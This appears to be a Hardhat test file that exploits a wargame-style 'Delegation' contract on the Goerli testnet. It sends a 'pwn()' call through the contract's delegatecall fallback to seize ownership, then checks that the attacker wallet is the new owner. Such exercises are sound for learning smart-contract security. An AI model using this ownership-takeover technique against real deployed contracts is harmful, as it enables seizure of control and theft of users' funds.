import { assert } from "chai"
import { network, ethers} from "hardhat"
import { developmentChains, networkConfig } from "../../helper-hardhat-config"
import { Delegation } from "../../typechain-types"
import "dotenv/config"
import abi from "../../artifacts/contracts/Delegation.sol/Delegation.json"


const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL
const PRIVATE_KEY = String(process.env.PRIVATE_KEY) 

developmentChains.includes(network.name)
    ? describe.skip
    : describe("Token hack staging", function () {
        let provider: any 
        let delegation: Delegation
        let addressContract: string
        let gas_limit:string
        let wallet:any
        let data:any

        beforeEach(async() => {
            provider =  new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
            wallet  = new ethers.Wallet(PRIVATE_KEY,provider)
            const functionSignature = 'pwn()';
            data = ethers.utils.id(functionSignature);

            addressContract = networkConfig[network.config.chainId!]["contractAddress"]!
            delegation = new ethers.Contract(addressContract,abi.abi, wallet)
            gas_limit = "0x300000" // 300.000

        })
        describe("Hack", function() {
            it("Check start balance", async() => {
                
                const tx = await wallet.sendTransaction({ 
                    from: wallet.address,
                    to: addressContract,
                    data: data,
                    gasLimit: ethers.utils.hexlify(gas_limit)
                })
                await provider.waitForTransaction(tx.hash,1)
                let owner = await delegation.owner()
                assert.equal(owner, wallet.address)
            })  
        })
    })